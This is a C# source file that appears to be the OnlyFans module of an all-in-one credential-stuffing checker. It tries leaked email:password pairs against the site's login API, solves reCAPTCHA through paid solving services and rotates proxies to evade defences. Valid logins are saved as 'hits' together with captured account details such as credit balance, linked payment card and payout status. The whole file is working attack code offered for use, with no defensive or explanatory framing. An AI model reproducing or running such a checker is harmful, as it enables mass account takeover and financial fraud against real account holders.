using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;


namespace Onlyfans
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {

                            SetBasicRequestSettingsAndProxies(req);

                            CookieStorage cookies = new CookieStorage();

                            req.Cookies = cookies;
                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("Accept", "application/json, text/plain, */*");
                            req.AddHeader("X-Requested-With", "only.fans");
                            req.AddHeader("Origin", "https://onlyfans.com");
                            req.AddHeader("Sec-Fetch-Mode", "cors");
                            req.UserAgent = "Mozilla/5.0 (Linux; Android 7.0; HTC One A9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36";

                            string captchaResponse = Check.GetRecaptchaV2("https://onlyfans.com/api2/v2/init?app-token=33d57ade8c02dbc5a333db99ff9ae26a", "6LfVUxkUAAAAAFwy-qwWGqKNhT1vqmYF-9ULPAWz");

                            if (captchaResponse.Contains("WrongKey"))
                            {
                                Console.WriteLine("[ALERT] " + " Wrong Key or Balance Empty!", Color.Red);
                            }
                            HttpResponse res = req.Post(new Uri("https://onlyfans.com/api2/v2/users/login?app-token=33d57ade8c02dbc5a333db99ff9ae26a"), new BytesContent(Encoding.Default.GetBytes("{\"email\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\",\"v3-recaptcha-response\":\"\",\"g-recaptcha-response\":\"" + captchaResponse + "\"}")));
                            string strResponse = res.ToString();

                            if (strResponse.Contains("\"accessToken\":\""))
                            {
                                string accessToken = Regex.Match(strResponse, "accessToken\":.*\"(.*?)\"").Groups[1].Value;
                                string capture = "";
                                for (int i2 = 0; i2 < Config.config.Retries + 1; i2++)
                                {
                                    capture = OnlyFansCaptures(accessToken, cookies);
                                    if (capture != "") break;
                                }
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - ONLYFANS] " + s[0] + ":" + s[1] + " | " + capture, Color.Green);
                                }
                                Export.AsResult("/Onlyfans_hits", s[0] + ":" + s[1] + " | " + capture);
                            }
                            else if (strResponse.Contains("\"Captcha wrong\"") || strResponse.Contains("\"Access denied.\""))
                            {
                               
                                break;
                            }
                            else
                            {
                                break;

                            }
                           
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
    
       
    static string OnlyFansCaptures(string accessToken, CookieStorage cookies)
    {
        while (true)
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    string subscribesCount = "?";
                    string creditBalance = "?";
                    string hasCC = "?";
                    string isPayoutLegalApproved = "?";

                    SetBasicRequestSettingsAndProxies(req);

                    req.Cookies = cookies;
                    req.AddHeader("Accept", "application/json");
                    req.AddHeader("X-Requested-With", "only.fans");
                    req.UserAgent = "Mozilla/5.0 (Linux; Android 7.0; HTC One A9 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.116 Mobile Safari/537.36";

                    HttpResponse res = req.Get(new Uri($"https://onlyfans.com/api2/v2/users/me?app-token=33d57ade8c02dbc5a333db99ff9ae26a"));
                    string strResponse = res.ToString();

                    if (res.StatusCode == HttpStatusCode.OK)
                    {
                        subscribesCount = Regex.Match(strResponse, "subscribesCount\":[ ]*(.*?)(,|})").Groups[1].Value;
                        creditBalance = Regex.Match(strResponse, "creditBalance\":[ ]*(.*?)(,|})").Groups[1].Value;
                        hasCC = Regex.Match(strResponse, "isPaymentCardConnected\":[ ]*(.*?)(,|})").Groups[1].Value;
                        isPayoutLegalApproved = Regex.Match(strResponse, "isPayoutLegalApproved\":[ ]*(.*?)(,|})").Groups[1].Value;

                        return $"Subscribes: {subscribesCount} - Credit Balance: {creditBalance} - Has Credit Card: {hasCC} - Payout Approved: {isPayoutLegalApproved}";
                    }
                    break;
                }
            }
            catch
            {
                    ZeusAIO.mainmenu.errors++;
                }
        return "";
    }
        public static string GetRecaptchaV2(string websiteURL, string websiteKey)
        {
            switch (Config.config.anti_captcha_service)
            {
                case "2Captcha":
                    return AntiCaptchas.TwoCaptcha.GetCaptchaKey(websiteURL, websiteKey, Config.config.anti_captcha_key);
                    break;
                case "AntiCaptcha":
                    return AntiCaptchas.AntiCaptcha.GetCaptchaKey(websiteURL, websiteKey, Config.config.anti_captcha_key);
                    break;
                default:
                    return "";

            }
        }

        static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }
    }
}
